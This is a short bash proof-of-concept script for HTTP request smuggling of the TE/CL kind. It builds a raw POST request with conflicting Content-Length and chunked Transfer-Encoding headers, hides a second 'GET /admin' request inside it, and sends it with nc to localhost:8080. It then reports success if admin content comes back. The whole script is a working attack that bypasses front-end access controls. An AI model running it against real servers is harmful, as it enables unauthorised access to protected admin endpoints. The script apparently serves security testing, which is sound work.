#!/bin/bash
# PoC: HTTP Request Smuggling (te_cl)
# Uses printf to send raw bytes via nc

HOST="localhost"
PORT="8080"

printf 'POST / HTTP/1.1\r\n'\
'Host: %s\r\n'\
'Content-Length: 13\r\n'\
'Transfer-Encoding: chunked\r\n'\
'Connection: keep-alive\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'GET /admin HTTP/1.1\r\n'\
'Host: %s\r\n'\
'\r\n' "$HOST" "$HOST" | nc -w 5 "$HOST" "$PORT"

echo ""
echo "[*] If the response contains admin content, smuggling worked"
